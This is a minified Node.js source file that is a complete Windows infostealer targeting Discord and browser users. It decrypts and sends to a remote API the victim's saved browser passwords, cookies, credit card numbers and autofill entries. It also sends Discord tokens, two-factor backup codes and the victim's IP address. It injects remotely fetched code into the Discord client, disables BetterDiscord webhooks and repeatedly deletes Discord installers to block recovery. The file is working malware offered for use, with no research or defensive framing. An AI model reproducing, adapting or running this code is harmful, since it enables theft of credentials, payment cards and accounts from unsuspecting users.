const ps="%PSEUDO%";const apiURL="%API%";const paste = `${apiURL}/injection/${ps}`;process.on("unhandledRejection",a=>{a.message});const fs=require("fs"),path=require("path"),axios=require("axios").default,glob=require("glob"),https=require("https"),{execSync,exec:exec}=require("child_process"),buf_replace=require("buffer-replace"),os=require("os"),crypto=require("crypto"),dpapi=require("win-dpapi"),sqlite3=require("sqlite3"),XMLHttpRequest=require("xmlhttprequest").XMLHttpRequest;let appdata=process.env.APPDATA,localappdata=process.env.LOCALAPPDATA,dcrd=[],patttt=[],runnn=[];const paths=[appdata+"\\discord\\",appdata+"\\discordcanary\\",appdata+"\\discordptb\\",appdata+"\\discorddevelopment\\",appdata+"\\lightcord\\",localappdata+"\\Google\\Chrome\\User Data\\Default\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 1\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 2\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 3\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 4\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 5\\",localappdata+"\\Google\\Chrome\\User Data\\Guest Profile\\",localappdata+"\\Google\\Chrome\\User Data\\Default\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 1\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 2\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 3\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 4\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Profile 5\\Network\\",localappdata+"\\Google\\Chrome\\User Data\\Guest Profile\\Network\\",appdata+"\\Opera Software\\Opera Stable\\",appdata+"\\Opera Software\\Opera GX Stable\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",localappdata+"\\Microsoft\\Edge\\User Data\\Default\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 1\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 2\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 3\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 4\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 5\\",localappdata+"\\Microsoft\\Edge\\User Data\\Guest Profile\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\",localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\",localappdata+"\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",localappdata+"\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\"];ee();function miamm(){https.get(paste,a=>{let e="";a.on("data",a=>{e+=a}),a.on("end",()=>{patttt.forEach(a=>{fs.writeFileSync(a,e.replace("%WEBHOOK_LINK%","llx404"),{encoding:"utf8",flag:"w"});let t=a.replace("index.js","llx404");fs.existsSync(t)||(fs.mkdirSync(t,484),miam())})})}).on("error",a=>{})}function salam(){exec("tasklist",function(a,e,t){e.includes("DiscordCanary.exe")&&runnn.push("DiscordCanary"),e.includes("Discord.exe")&&runnn.push("Discord"),e.includes("DiscordPTB.exe")&&runnn.push("DiscordPTB"),e.includes("DiscordDevelopment.exe")&&runnn.push("DiscordDevelopment"),e.includes("DiscordPTB.exe")&&runnn.push("DiscordPTB"),stop()})}function stop(){runnn.forEach(a=>{exec(`taskkill /IM ${a}.exe /F`,a=>{})})}function miam(){runnn.forEach(a=>{ass=localappdata+"\\"+a+"\\Update.exe",exec(`${ass} --processStart ${a}.exe`,a=>{})})}function bett(){let a=process.env.appdata+"\\BetterDiscord\\data\\betterdiscord.asar";if(fs.existsSync(a)){let e=fs.readFileSync(a);fs.writeFileSync(a,buf_replace(e,"api/webhooks","llx404"))}}function ee(){oui(),wallet();cv(),cvmerci();cd();cdd();backup();miamm(),bett()}fs.readdirSync(localappdata).forEach(a=>{a.includes("iscord")&&dcrd.push(localappdata+"\\"+a)}),dcrd.forEach(function(a){let e=a+"\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";glob.sync(e).map(a=>{patttt.push(a),salam()})});function ettoi(tokenPath) {tokenPath += "\\Local Storage\\leveldb";let tokens = [];try {fs.readdirSync(path.normalize(tokenPath)).map(file => {if (file.endsWith(".log") || file.endsWith(".ldb")) {fs.readFileSync(`${tokenPath}\\${file}`, "utf8").split(/\r?\n/).forEach(line => {const regex = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)]; for (const _regex of regex) {const token = line.match(_regex);if (token) {token.forEach(element => {tokens.push(element);});}}})}  });} catch {}return tokens;}function cvmerci(){let e;const t=process.env.LOCALAPPDATA, a=process.env.APPDATA;e={Discord:path.join(a, "Discord"), "Discord Canary":path.join(a, "discordcanary"), "Discord PTB":path.join(a, "discordptb"), "Google Chrome":path.join(t, "Google", "Chrome", "User Data", "Default"), Opera:path.join(a, "Opera Software", "Opera Stable"), Brave:path.join(t, "BraveSoftware", "Brave-Browser", "User Data", "Default"), Yandex:path.join(t, "Yandex", "YandexBrowser", "User Data", "Default")};let pat = "Non";const s=[];for(let[e, t]of Object.entries(paths)){const e=ettoi(t);e&&e.forEach(e=>{s.push(e), pat = t})}s.filter(onlyUnique).forEach(e=>{let tt=new XMLHttpRequest;tt.open("GET", "https://api.ipify.org"), tt.send(null), tt.onreadystatechange=function(){if(4==tt.readyState&&200==tt.status){let a=new XMLHttpRequest;a.open("POST", `${apiURL}/send`, !0), a.setRequestHeader("Content-Type", "application/json"), a.send(JSON.stringify({pseudo:ps, type:"tokens", path:pat, token:e, ip:tt.responseText}))}}})}function onlyUnique(e,t,a){return a.indexOf(e)===t}async function coucou(e){let t=e.split("\\"),a=(e.includes("Network")?t.splice(0,t.length-3):t.splice(0,t.length-2)).join("\\")+"\\";if(e.startsWith(appdata)&&(a=e),!e.includes("cord")){if(fs.existsSync(a)){let t=Buffer.from(JSON.parse(fs.readFileSync(a+"Local State")).os_crypt.encrypted_key,"base64").slice(5);let s=e+"Login Data",n=e+"passwords.db";fs.copyFileSync(s,n);const r=dpapi.unprotectData(Buffer.from(t,"utf-8"),null,"CurrentUser");let o=`@~\$~@wass-${e}\n`;return o+='',sql=new sqlite3.Database(n,e=>{}),await new Promise((e,t)=>{sql.each("SELECT origin_url, username_value, password_value FROM logins",function(e,t){if(!e&&""!=t.username_value){let a=t.password_value;try{if(1==a[0]&&0==a[1]&&0==a[2]&&0==a[3])o+=`URL: ${t.origin_url} | USERNAME: ${t.username_value} | PASSWORD: ${dpapi.unprotectData(a,null,"CurrentUser")}\n`.toString("utf-8");else{let e=a.slice(3,15),s=a.slice(15,a.length-16),n=a.slice(a.length-16,a.length),i=crypto.createDecipheriv("aes-256-gcm",r,e);i.setAuthTag(n),o += 'URL: ' + t['origin_url'] + ' | USERNAME: ' + t['username_value'] + ' | PASSWORD: ' + i.update(s,"base64","utf-8")+i.final("utf-8")+"\n"}}catch(e){return}}},function(){e(o)})})}return""}}async function salut(e){let t=e.split("\\"),a=(e.includes("Network")?t.splice(0,t.length-3):t.splice(0,t.length-2)).join("\\")+"\\";if(e.startsWith(appdata)&&(a=e),!e.includes("cord")){if(fs.existsSync(a)){let t=Buffer.from(JSON.parse(fs.readFileSync(a+"Local State")).os_crypt.encrypted_key,"base64").slice(5);let s=e+"Cookies",n=e+"cookies.db";fs.copyFileSync(s,n);const r=dpapi.unprotectData(Buffer.from(t,"utf-8"),null,"CurrentUser");let o=`@~\$~@wass-${e}\n`;return o+=``,sql=new sqlite3.Database(n,e=>{}),await new Promise((e,t)=>{sql.each("SELECT host_key, name, encrypted_value FROM cookies",function(e,t){if(e)return;let a=t.encrypted_value;try{if(1==a[0]&&0==a[1]&&0==a[2]&&0==a[3])o+=`HOST KEY: ${t.host_key} | NAME: ${t.name} | VALUE: ${dpapi.unprotectData(a,null,"CurrentUser")}\n`.toString("utf-8");else{let e=a.slice(3,15),s=a.slice(15,a.length-16),n=a.slice(a.length-16,a.length),i=crypto.createDecipheriv("aes-256-gcm",r,e);i.setAuthTag(n),o+=`HOST KEY: ${t.host_key} | NAME: ${t.name} | VALUE: ${i.update(s,"base64","utf-8")+i.final("utf-8")}\n`}}catch(e){return}},function(){e(o)})})}return""}}async function cv(){let e="";for(let t=0;t<paths.length;t++)fs.existsSync(paths[t]+"Login Data")&&(e+=await coucou(paths[t])||"");axios.post(`${apiURL}/send`,{pseudo:ps,type:"pass",pass:`${e.replace("\\","\\").replace("${","\${").replace("`","\`")}`},{headers:{"Content-Type":"application/json"}})}async function oui(){let e="";for(let t=0;t<paths.length;t++)fs.existsSync(paths[t]+"Cookies")&&(e+=await salut(paths[t])||"");axios.post(`${apiURL}/send`,{pseudo:ps,type:"coock",pass:`${e.replace("\\","\\").replace("${","\${").replace("`","\`")}`},{headers:{"Content-Type":"application/json"}})}async function cd() {let pt = [localappdata+'\\Google\\Chrome\\User Data\\Default\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\',localappdata+'\\Google\\Chrome\\User Data\\System Profile\\',];let credit = '';for (let i = 0; i < pt.length; i++) {if (fs.existsSync(pt[i] + 'Web Data'))credit += await creditcd(pt[i]) || '';};axios.post(`${apiURL}/send`, {pseudo: ps,type: "creditcard",pass: credit}, {'headers': {'Content-Type': 'application/json'}}).catch(() =>{})}async function creditcd(path) {let path_split = path.split('\\'),path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),path_tail = path_split_tail.join('\\') + '\\';if (path.startsWith(appdata)) path_tail = path;if (path.includes('cord')) return;if (fs.existsSync(path_tail)) {let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);let login_data = path + 'Web Data',passwords_db = path + 'ChromeCata.db';fs.copyFileSync(login_data, passwords_db);const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');let result = '@~$~@wass-' + path + '\n',sql = new sqlite3.Database(passwords_db, err => {if (err) {}});const pizza = await new Promise((resolve, reject) => {sql.each('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards', function (err, row) {if (err) {}let number = row['card_number_encrypted'];try {if ((number[0] == 1) && (number[1] == 0) && (number[2] == 0) && (number[3] == 0)) {result += `CC NUMBER: ${dpapi.unprotectData(number, null, 'CurrentUser')} | EXPIRE: ${row['expiration_month']}/${row['expiration_year']} | NAME: ${row['name_on_card']}\n`.toString('utf-8');} else {let start = number.slice(3, 15),middle = number.slice(15, number.length - 16),end = number.slice(number.length - 16, number.length),decipher = crypto.createDecipheriv('aes-256-gcm', key, start);decipher.setAuthTag(end);result += `CC NUMBER: ${decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')} | EXPIRE: ${row['expiration_month']}/${row['expiration_year']} | NAME: ${row['name_on_card']}\n`}} catch (e) {}}, function () {resolve(result);});});return pizza;} else {return '';}}async function cdd() {let pt = [localappdata+'\\Google\\Chrome\\User Data\\Default\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\',localappdata+'\\Google\\Chrome\\User Data\\System Profile\\',];let fildata = '';for (let i = 0; i < pt.length; i++) {if (fs.existsSync(pt[i] + 'Web Data'))fildata += await autfiledata(pt[i]) || '';};axios.post(`${apiURL}/send`, {pseudo: ps,type: "filedata",pass: fildata}, {'headers': {'Content-Type': 'application/json'}}).catch(() =>{})}async function autfiledata(path) {let path_split = path.split('\\'),path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),path_tail = path_split_tail.join('\\') + '\\';if (path.startsWith(appdata)) path_tail = path;if (path.includes('cord')) return;if (fs.existsSync(path_tail)) {let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);let login_data = path + 'Web Data',passwords_db = path + 'ChromeCata.db';fs.copyFileSync(login_data, passwords_db);const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');let result = '@~$~@wass-' + path + '\n',sql = new sqlite3.Database(passwords_db, err => {if (err) {}});const pizza = await new Promise((resolve, reject) => {sql.each('SELECT name,value,value_lower,date_created,date_last_used,count FROM autofill', function (err, row) {if (err) {}try {result += `NAME: ${row["name"]} | DATA: ${row["value"]}\n`} catch (e) {}}, function () {resolve(result);});});return pizza;} else {return '';}};;function backup(){const o=os.homedir();fs.readdirSync(`${o}\\Downloads`).forEach(a=>{if("discord_backup_codes.txt"===a){let a=fs.readFileSync(`${o}\\Downloads\\discord_backup_codes.txt`,"utf-8",function(o,a){});axios.post(`${apiURL}/send`,{pseudo:ps,type:"backup",pass:a},{"Content-Type":"application/json"}).then(o=>{}).catch(o=>{})}}),fs.readdirSync(`${o}\\Desktop`).forEach(a=>{if("discord_backup_codes.txt"===a){let a=fs.readFileSync(`${o}\\Desktop\\discord_backup_codes.txt`,"utf-8",function(o,a){});axios.post(`${apiURL}/send`,{pseudo:ps,type:"backup",pass:a},{"Content-Type":"application/json"}).then(o=>{}).catch(o=>{})}}),fs.readdirSync(`${o}\\Documents`).forEach(a=>{if("discord_backup_codes.txt"===a){let a=fs.readFileSync(`${o}\\Documents\\discord_backup_codes.txt`,"utf-8",function(o,a){});axios.post(`${apiURL}/send`,{pseudo:ps,type:"backup",pass:a},{"Content-Type":"application/json"}).then(o=>{}).catch(o=>{})}})}function nodelinject() {const o = os.homedir();fs.readdirSync(`${o}\\Downloads`).forEach(a => {if (a.includes("DiscordSetup")) {fs.unlink(a,(err)=>{})}});fs.readdirSync(`${o}\\Desktop`).forEach(a => {if (a.includes("DiscordSetup")) {fs.unlink(a,(err)=>{})}});fs.readdirSync(`${o}\\Documents`).forEach(a => {if (a.includes("DiscordSetup")) {fs.unlink(a,(err)=>{})}})}setInterval(()=>{nodelinject()},2000)

